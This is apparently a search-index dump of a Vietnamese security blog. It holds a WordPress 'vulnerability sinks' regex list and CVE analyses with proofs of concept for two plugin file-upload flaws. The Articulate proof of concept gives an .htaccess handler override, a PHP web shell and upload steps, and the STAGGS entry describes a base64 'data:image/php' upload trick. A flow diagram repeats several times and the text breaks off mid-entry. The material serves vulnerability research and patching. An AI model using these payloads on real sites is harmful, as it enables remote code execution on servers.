fputcsv rename ZipArchive::extractTo PharData::extractTo unzip_file \\b(move_uploaded_file|file_put_contents|fwrite|fputs|copy|fputcsv|rename|ZipArchive::extractTo|PharData::extractTo|unzip_file)\\b WordPress related WP_Filesystem_Direct::put_contents WP_Filesystem_Direct::move WP_Filesystem_Direct::copy wp_handle_upload() with test_type =\u003e false \\b(WP_Filesystem_Direct::put_contents|WP_Filesystem_Direct::move|WP_Filesystem_Direct::copy|wp_handle_upload)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:5","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-upload"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Read\rPHP related file_get_contents readfile fopen fread fgets fgetcsv fgetss (deprecated from PHP 7.3) file curl_exec / cURL \\b(file_get_contents|readfile|fopen|fread|fgets|fgetcsv|fgetss|file|curl_exec)\\b WordPress related WP_Filesystem_Direct::get_contents WP_Filesystem_Direct::get_contents_array \\b(WP_Filesystem_Direct::get_contents|WP_Filesystem_Direct::get_contents_array)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:6","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-read"},{"categories":["Bug Bounty"],"collections":null,"content":"Arbitrary File Deletion\rPHP related unlink rmdir \\b(unlink|rmdir)\\b WordPress related wp_delete_file wp_delete_file_from_directory WP_Filesystem_Direct::delete WP_Filesystem_Direct::rmdir \\b(wp_delete_file|wp_delete_file_from_directory|WP_Filesystem_Direct::delete|WP_Filesystem_Direct::rmdir)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:7","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#arbitrary-file-deletion"},{"categories":["Bug Bounty"],"collections":null,"content":"PHP Object Injection\runserialize maybe_unserialize \\b(unserialize|maybe_unserialize)\\b ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:8","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#php-object-injection"},{"categories":["Bug Bounty"],"collections":null,"content":"Remote Code Execution (RCE)\rsystem exec shell_exec passthru proc_open eval call_user_func call_user_func_array create_function *(DEPRECATED t·ª´ PHP 7.2.0, REMOVED t·ª´ PHP 8.0.0) \\b(system|exec|shell_exec|passthru|proc_open|eval|call_user_func|call_user_func_array|create_function)\\b \\$\\w+\\( ","date":"2025-11-13","objectID":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/:2:9","tags":["sink","wordpress"],"title":"WordPress Vulnerability Sinks","uri":"/vi/posts/2025-11-13-wordpress-vulnerability-sink/#remote-code-execution-rce"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Articulate Content into WordPress Plugin.","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Arbitrary File Upload trong Brian Batt - elearningfreak.com ƒë·ªëi v·ªõi plugin Insert or Embed Articulate Content into WordPress cho ph√©p t·∫£i l√™n m·ªôt Web Shell l√™n m√°y ch·ªß web. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn Insert or Embed Articulate Content into WordPress: t·ª´ n/a ƒë·∫øn 4.3000000025. CVE ID: CVE-2025-32202 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.3000000025 Patched Versions: 4.3000000026 CVSS severity: Medium (9.1) Required Privilege: Editor Product: WordPress Embed Articulate Content into WordPress Plugin ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Embed Articulate Content into WordPress: 4.3000000025 ‚Äì vulnerable 4.3000000026 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng n·∫±m trong h√†m articulate_has_php_file() t·∫°i /wp-content/plugins/insert-or-embed-articulate-content-into-wordpress/functions.php do ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß, cho ph√©p attacker t·∫£i l√™n file .htaccess nh·∫±m ghi ƒë√® c∆° ch·∫ø x·ª≠ l√Ω trong th∆∞ m·ª•c upload; k·∫øt qu·∫£ l√† c√°c file upload sau ƒë√≥ v·ªõi ph·∫ßn m·ªü r·ªông do attacker ƒë·∫∑t (v√≠ d·ª• .abc, .xnxx) c√≥ th·ªÉ th·ª±c thi nh∆∞ file PHP. Th√™m ƒëi·ªÅu ki·ªán ki·ªÉm tra .htaccess\rB·∫£n v√° ƒë√£ th√™m ƒëi·ªÅu ki·ªán check .htaccess khi upload file gi√∫p ngƒÉn ch·∫∑n l·ªó h·ªïng x·∫£y ra. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p add_action( 'wp_ajax_articulate_upload_file', 'articulate_upload_ajax_file' ); T·ª©c khi truy c·∫≠p endpoint /wp-admin/admin-ajax.php v·ªõi param action=articulate_upload_file th√¨ callback articulate_upload_ajax_file ƒë∆∞·ª£c g·ªçi function articulate_upload_ajax_file() { articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); if ( ! is_user_logged_in() || ! current_user_can( 'upload_files' ) || ! current_user_can( 'unfiltered_html' ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'You do not have permissions to upload this file. Contact your admin to get the unfiltered_html capability.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $count_dirs = getDirs(); // you can use WP's wp_handle_upload() function: $file = $_FILES['async-upload']; $dir = untrailingslashit( getUploadsPath() ); if ( empty( $_FILES ) || $_FILES['async-upload']['error'] ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to move uploaded file. Please check if the folder has write permissions.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } $chunk = isset( $_REQUEST['chunk'] ) ? intval( $_REQUEST['chunk'] ) : 0; $chunks = isset( $_REQUEST['chunks'] ) ? intval( $_REQUEST['chunks'] ) : 0; $fileName = isset( $_REQUEST['name'] ) ? sanitize_file_name( $_REQUEST['name'] ) : sanitize_file_name( $_FILES['async-upload']['name'] ); $filePath = '' . $dir . '/' . sanitize_file_name( $fileName ) . ''; // Open temp file $out = @fopen( \"{$filePath}.part\", $chunk == 0 ? 'wb' : 'ab' ); if ( $out ) { // Read binary input stream and append it to temp file $in = @fopen( $_FILES['async-upload']['tmp_name'], 'rb' ); if ( $in ) { while ( $buff = fread( $in, 4096 ) ) { fwrite( $out, $buff ); } } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open input stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } @fclose( $in ); @fclose( $out ); @unlink( $_FILES['async-upload']['tmp_name'] ); } else { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to open output stream. Please check if the folder has write permissions', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Security check. $mime = wp_check_filetype( $filePath ); $mimes = get_allowed_mime_types( get_current_user_id() ); if ( ! isset( $mime['type'] ) || ! in_array( $mime['type'], array_values( $mimes ) ) ) { die( json_encode( array( 'OK' =\u003e 0, 'info' =\u003e __( 'Failed to upload this file for security reasons. Contact your admin to ensure your user can access all mime types from get_allowed_mime_types.', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } // Check if file has been uploaded if ( ! $chunks || $chunk == $chunks - 1 ) { // Strip the temp .part suffix off articulate_custom_rename( \"{$filePath}.part\", $filePath ); // start extracting // unzip file $dir = explode( '.', $fileName ); $dir[0] = str_replace( ' ', '_', $dir[0] ); $target = getUploadsPath() . $dir[0]; $file = $filePath; while ( file_exists( $target ) ) { $r = rand( 1, 10 ); $target .= $r; $dir[0] .= $r; } $arr = extractZip( $file, $target, $dir[0] ); unlink( $filePath ); do_action( hook_name: 'iea/uploaded_quiz', $arr, $target ); $ok = isset( $arr[4] ) ? $arr[4] : 0; $response = array( 'OK' =\u003e $ok, 'info' =\u003e $arr[0], 'folder' =\u003e $arr[2], 'path' =\u003e $arr[1], 'name' =\u003e $arr[3], 'target' =\u003e $target, ); die( json_encode( $response ) ); } else { die( json_encode( array( 'OK' =\u003e 1, 'info' =\u003e __( 'Uploading chunks!', 'insert-or-embed-articulate-content-into-wordpress' ), ) ) ); } exit; }; H√†m articulate_upload_ajax_file() x·ª≠ l√Ω upload file qua AJAX cho plugin. C·ª• th·ªÉ: Kh·ªüi t·∫°o \u0026 b·∫£o m·∫≠t c∆° b·∫£n articulate_setup_php_ini(); check_ajax_referer( 'articulate_upload_file' ); articulate_setup_php_ini() ‚Äî ch·ªânh c√°c setting PHP (th∆∞·ªùng ƒë·ªÉ cho ph√©p upload l·ªõn h∆°n, timeout‚Ä¶). check_ajax_referer() ‚Äî ki·ªÉm tra nonce ƒë","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file ‚Üí save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename ‚Üí articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) ‚Üí delete folder ‚Üí return error\"]\rI -- No --\u003e K[\"(‚ùå Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"‚Üí Arbitrary File Upload ‚Üí Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"‚úÖ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file ‚Üí save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename ‚Üí articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) ‚Üí delete folder ‚Üí return error\"]\rI -- No --\u003e K[\"(‚ùå Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"‚Üí Arbitrary File Upload ‚Üí Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"‚úÖ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file ‚Üí save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename ‚Üí articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) ‚Üí delete folder ‚Üí return error\"]\rI -- No --\u003e K[\"(‚ùå Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"‚Üí Arbitrary File Upload ‚Üí Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"‚úÖ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file ‚Üí save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename ‚Üí articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o c·∫•u tr√∫c th∆∞ m·ª•c sau: bypass . ‚îú‚îÄ‚îÄ .htaccess ‚îú‚îÄ‚îÄ index.html ‚îî‚îÄ‚îÄ rce.abc .htaccess \u003cIfModule mod_php.c\u003e \u003cFiles \"*.abc\"\u003e SetHandler application/x-httpd-php \u003c/Files\u003e \u003c/IfModule\u003e T·∫°o rule, c√≥ th·ªÉ upload file .abc trong th∆∞ m·ª•c hi·ªán t·∫°i v√† th∆∞ m·ª•c con. Khi·∫øn n√≥ th·ª±c thi nh∆∞ file .php rce.abc Ch·ª©a web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e N√©n th∆∞ m·ª•c l·∫°i th√†nh file .zip zip -r bypass.zip bypass Upload file zip v·ª´a t·∫°o Widget c·ªßa plugin trong t·∫°o post\rTh√¥ng tin\rƒê√¢y l√† ch·ª©c nƒÉng ƒë∆∞·ª£c m√¥t t·∫£ trong document c·ªßa plugin, ta t·∫°o post r·ªìi th√™m widget n√†y sau ƒë√≥ th·ª±c hi·ªán upload zip file Widget e-Elearning\rRequest v√† Response trong BurpSuite: Request v√† Response trong BurpSuite\rRCE v·ªõi web shell RCE v·ªõi file upload\r","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-32202 ph√°t sinh do plugin Insert or Embed Articulate Content into WordPress ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß lo·∫°i file ƒë∆∞·ª£c gi·∫£i n√©n, b·ªè s√≥t tr∆∞·ªùng h·ª£p .htaccess. ƒêi·ªÅu n√†y cho ph√©p attacker c√≥ quy·ªÅn Editor t·∫£i l√™n m·ªôt file .htaccess ƒë·ªÉ ghi ƒë√® c∆° ch·∫ø x·ª≠ l√Ω file trong th∆∞ m·ª•c upload. K·∫øt qu·∫£ l√† c√°c file ƒë∆∞·ª£c t·∫£i l√™n sau ƒë√≥, d√π c√≥ ph·∫ßn m·ªü r·ªông t√πy √Ω (nh∆∞ .abc, .xyz), v·∫´n c√≥ th·ªÉ ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ file PHP, d·∫´n ƒë·∫øn Remote Code Execution (RCE). B·∫£n v√° 4.3000000026 ƒë√£ b·ªï sung ki·ªÉm tra ƒë·ªëi v·ªõi .htaccess, ngƒÉn ch·∫∑n vi·ªác ghi ƒë√® handler trong th∆∞ m·ª•c upload v√† lo·∫°i b·ªè kh·∫£ nƒÉng khai th√°c n√†y. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rC·∫ßn ki·ªÉm tra ch·∫∑t ch·∫Ω m·ªçi lo·∫°i file c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ƒë·∫øn h√†nh vi m√°y ch·ªß, ƒë·∫∑c bi·ªát l√† .htaccess Kh√¥ng ch·ªâ d·ª±a v√†o ph·∫ßn m·ªü r·ªông file; c·∫ßn x√°c th·ª±c c·∫£ MIME type v√† n·ªôi dung th·ª±c t·∫ø c·ªßa file. Kh√¥ng n√™n cho ph√©p ng∆∞·ªùi d√πng, k·ªÉ c·∫£ t√†i kho·∫£n c√≥ quy·ªÅn Editor, t·∫£i l√™n file n√©n ch·ª©a n·ªôi dung c√≥ th·ªÉ th·ª±c thi. C·∫ßn t√°ch bi·ªát r√µ r√†ng th∆∞ m·ª•c upload c·ªßa ng∆∞·ªùi d√πng kh·ªèi th∆∞ m·ª•c c√≥ th·ªÉ th·ª±c thi PHP. Th∆∞·ªùng xuy√™n ki·ªÉm tra v√† c·∫≠p nh·∫≠t plugin; c√°c l·ªói nh·ªè trong c∆° ch·∫ø l·ªçc file c√≥ th·ªÉ d·∫´n t·ªõi RCE nghi√™m tr·ªçng. ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Insert or Embed Articulate Content into WordPress Plugin \u003c= 4.3000000025 is vulnerable to Arbitrary File Upload ","date":"2025-11-12","objectID":"/vi/posts/2025-11-12-cve-2025-32202/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/vi/posts/2025-11-12-cve-2025-32202/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress STAGGS Plugin.","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Arbitrary File Upload trong plugin STAGGS cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n Web Shell l√™n m√°y ch·ªß web, ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n STAGGS t·ª´ n/a ƒë·∫øn 2.11.0. CVE ID: CVE-2025-47637 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.11.0 Patched Versions: 2.12.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress STAGGS Plugin ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - STAGGS: 2.11.0 ‚Äì vulnerable 2.12.0 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng x·∫£y ra trong h√†m store_final_product_image() thu·ªôc file /wp-content/plugins/staggs/includes/staggs-functions.php do kh√¥ng x√°c th·ª±c file type tr∆∞·ªõc khi upload X√°c th·ª±c file type\rB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng while list, ch·ªâ ch·∫•p nh·∫≠n c√°c lo·∫°i file: png,jpg,jpeg,gif ","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook d√†nh cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (wp_ajax_nopriv_): add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' ); Khi truy c·∫≠p endpoint /wp-admin/admin-ajax.php v·ªõi param action=staggs_get_configuration_form_urls th√¨ callback staggs_get_configuration_form_urls_ajax ƒë∆∞·ª£c g·ªçi function staggs_get_configuration_form_urls_ajax() { $response = array(); if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) { echo json_encode( $response ); die(); } ... if ( isset( $_POST['image_id'] ) ) { $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title. $image_url = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true ); $response['image_url'] = $image_url; } ... echo json_encode( $response ); die(); } H√†m n√†y ki·ªÉm tra nonce t·ª´ request, n·∫øu n√≥ kh√¥ng t·ªìn t·∫°i ho·∫∑c kh√¥ng h·ª£p l·ªá th√¨ tr·∫£ v·ªÅ response r·ªóng M·∫πo Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a sgg_ajax_nonce, ta th·∫•y nonce ƒë∆∞·ª£c t·∫°o b·∫±ng key AJAX_NONCE v√† c√≥ comment // image name based on product title. li√™n quan ƒë·∫øn product. Do ph·∫ßn n√†y kh√¥ng y√™u c·∫ßu x√°c th·ª±c, c√≥ th·ªÉ ƒë√¢y l√† c∆° ch·∫ø ph·ª•c v·ª• vi·ªác hi·ªÉn th·ªã product cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p, v√† nonce ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o m√£ ngu·ªìn. Khi th·ª≠ t√≠nh nƒÉng t·∫°o product c·ªßa plugin, h·ªá th·ªëng t·∫°o m·ªôt post m√† ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p v·∫´n c√≥ th·ªÉ truy c·∫≠p. nonce n√†y xu·∫•t hi·ªán trong m√£ ngu·ªìn tr·∫£ v·ªÅ khi truy c·∫≠p product v·ª´a ƒë∆∞·ª£c t·∫°o. C√°ch nonce ƒë∆∞·ª£c t·∫°o\rT·∫°o Product b·∫±ng plugin\rNonce l·∫•y t·ª´ response\rN·∫øu nonce h·ª£p l·ªá, ti·∫øp t·ª•c ki·ªÉm tra $_POST['image_id'] c√≥ t·ªìn t·∫°i hay kh√¥ng, n·∫øu c√≥: L·∫•y image name t·ª©c t√™n c·ªßa product title (theo m√¥ t·∫£: // image name based on product title.) G·ªçi store_final_product_image() ƒë·ªÉ l∆∞u ·∫£nh v√† l·∫•y URL tr·∫£ v·ªÅ Tr·∫£ v·ªÅ ph·∫£n h·ªìi JSON ch·ª©a image_url. function store_final_product_image( $imagename, $data, $options, $main_image = true) { if ( preg_match( '/^data:image\\/(.*);base64,/', $data, $type ) ) { // Valid base64 image. $data = substr( $data, strpos($data, ',') + 1 ); $type = strtolower( $type[1] ); // jpg, png, gif $data = str_replace( ' ', '+', $data ); $data = base64_decode($data); if ( $data === false ) { throw new \\Exception('Image decode failed. Try again.'); } } ... $upload_dir = wp_get_upload_dir(); $base_dir = $upload_dir['basedir']; // Allow different location. $save_path = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' ); if ( ! file_exists( $save_path ) ) { mkdir( $save_path, 0777, true ); } if ( $main_image ) { // Main product image. if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } } ... // Always override in case something went wrong earlier file_put_contents( $save_path . \"/{$filename}\", $data ); $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path ); return $image_path_url . \"/{$filename}\"; } L·ªánh: preg_match('/^data:image\\/(.*);base64,/', $data, $type) D√πng ƒë·ªÉ ki·ªÉm tra xem bi·∫øn $data c√≥ ph·∫£i l√† chu·ªói ·∫£nh ·ªü ƒë·ªãnh d·∫°ng Base64 Data URI hay kh√¥ng. C·ª• th·ªÉ: ^data:image\\/ ‚Üí chu·ªói ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng data:image/ (.*) ‚Üí l·∫•y ph·∫ßn ƒë·ªãnh d·∫°ng ·∫£nh (v√≠ d·ª•: png, jpeg, gif, ‚Ä¶) ;base64, ‚Üí ti·∫øp theo ph·∫£i c√≥ chu·ªói ;base64, (b√°o hi·ªáu d·ªØ li·ªáu ·∫£nh ƒë∆∞·ª£c m√£ h√≥a Base64) N·∫øu kh·ªõp, m·∫£ng $type s·∫Ω ch·ª©a th√¥ng tin ƒë·ªãnh d·∫°ng ·∫£nh, v√≠ d·ª•: $type[1] = 'png'; N·∫øu kh√¥ng kh·ªõp, t·ª©c $data kh√¥ng ph·∫£i l√† d·ªØ li·ªáu ·∫£nh Base64 h·ª£p l·ªá, h√†m tr·∫£ v·ªÅ 0. Sau ƒë√≥ $type ƒë∆∞·ª£c g√°n gi√° tr·ªã c·ªßa $type[1] L·ªói\rTa c√≥ th·ªÉ truy·ªÅn $data=data:image/php;base64... ƒë·ªÉ $type[1] ='php' if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } N·∫øu $options kh√¥ng ƒë∆∞·ª£c truy·ªÅn th√¨ $filename s·∫Ω c√≥ d·∫°ng product_title.$type Cu·ªëi c√πng, file ƒë∆∞·ª£c l∆∞u b·∫±ng h√†m file_put_contents() v√† tr·∫£ v·ªÅ URL ƒë·∫´n","date":"2025-11-11","objectID":"/vi/posts/2025-11-11-cve-2025-47637/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/vi/posts/2025-11-11-cve-2025-47637/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph 